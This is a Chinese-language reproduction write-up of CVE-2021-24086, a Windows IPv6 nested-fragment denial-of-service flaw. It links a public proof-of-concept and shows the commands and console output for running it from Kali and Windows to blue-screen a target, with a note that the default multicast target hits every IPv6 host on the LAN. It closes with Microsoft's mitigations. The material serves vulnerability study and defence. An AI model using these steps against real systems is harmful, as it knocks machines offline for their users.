## 简介

Windows
IPv6协议栈存在一处拒绝服务漏洞，此漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，在IPv6
ReassembleDatagram中发生的NULL指针取消引用，发生崩溃。

远程攻击者可通过向目标系统发送特制数据包来利用此漏洞，成功利用此漏洞可导致目标系统拒绝服务（蓝屏）。

## 漏洞影响系统版本

![1622358291_60b339135c29e29f8ae73.png!small?1622358339385](https://image.3001.net/images/20210530/1622358291_60b339135c29e29f8ae73.png!small?1622358339385)

## 测试环境

> 攻击主机：  
> Kali
>
> 受害主机：  
> 版本 Windows 10 专业版  
> 版本号 1903  
> 操作系统内部版本 18362.30  
> fe80::f13b:b0d2:f5f8:f1f0%14

## 漏洞复现

1.下载POC

<https://github.com/0vercl0k/CVE-2021-24086>  

2.防火墙开启，防护正常开启。

![](https://image.3001.net/images/20210530/1622358443_60b339ab73d443b2cace3.png!small)

3.运行POC：

> root@kali:~/Desktop/漏洞复现/CVE-2021-24086# python3 cve-2021-24086.py  
> 66 fragments, total size 0xfff8  
> ..................................................................  
> Sent 66 packets.  
> .  
> Sent 1 packets.  
> root@kali:~/Desktop/漏洞复现/CVE-2021-24086# python3 cve-2021-24086.py --target
> fe80::f13b:b0d2:f5f8:f1f0%14  
> 66 fragments, total size 0xfff8  
> ..................................................................  
> Sent 66 packets.  
> .  
> Sent 1 packets.  
> root@kali:~/Desktop/漏洞复现/CVE-2021-24086#

这里默认是不加target参数，由脚本代码可知，缺省值 ff02::1
指所有开启了IPv6组播的机器，直接运行就会进行组播，如果同一局域网内还有其他主机，可加上参数指定受害机器，防止误伤。经实验确认，两种方式都能达到蓝屏效果。

4.受害机器蓝屏：

![](https://image.3001.net/images/20210530/1622358444_60b339ac6517fbb2ab275.png!small)

如果要在Windows上跑POC脚本的话需要配置好环境然后指定对应的虚拟网卡

先安装配置好python3环境

由于Winpcap已经停止维护，所以安装Npcap（<https://nmap.org/npcap/#download>）

5.安装Scapy库

>
> https://gitee.https://image.3001.net/images/20210530/1622358444_60b339ac6517fbb2ab275.png!small/maxrun/pic/raw/master/image-20210517233957897.png

6.修改脚本主函数的iface默认值或者在运行脚本的时候添加---iface参数来指定网卡，两种方法都可以。

> ......  
> def main():  
> parser = argparse.ArgumentParser()  
> parser.add_argument('--target', default = 'ff02::1')  
> parser.add_argument('--iface', default = 'VMware Network Adapter VMnet8')  
> args = parser.parse_args()  
> pull_the_trigger(args)  
> return  
> ......

7.直接运行脚本进行组播。

> C:\Users\zeeker\Desktop\CVE-2021-24086>python3
> C:\Users\zeeker\Desktop\CVE-2021-24086\cve-2021-24086.py  
> 66 fragments, total size 0xfff8  
> ..................................................................  
> Sent 66 packets.  
> .  
> Sent 1 packets.
>
> C:\Users\zeeker\Desktop\CVE-2021-24086>

8.目标机器如上图同样蓝屏。

## 缓解措施

引用微软官方措施

 **1\. Set global reassemblylimit to 0**

The following command disables packet reassembly. Any out-of-order packets are
dropped. Valid scenarios should not exceed more than 50 out-of-order
fragments. We recommend testing prior to updating production systems.

> Netsh int ipv6 set global reassemblylimit=0

Further netsh guidance can be found at netsh.

 **Impact of workaround**

There is a potential for packet loss when discarding out-of-order packets.

 **How to undo the workaround**

To restore to default setting "267748640":

> Netsh int ipv6 set global reassemblylimit=267748640

 **2\. Configure an Edge device, such as a firewall or load balancer, to
disallow IPv6 fragmentation. Host based firewalls do not provide sufficient
protection.**

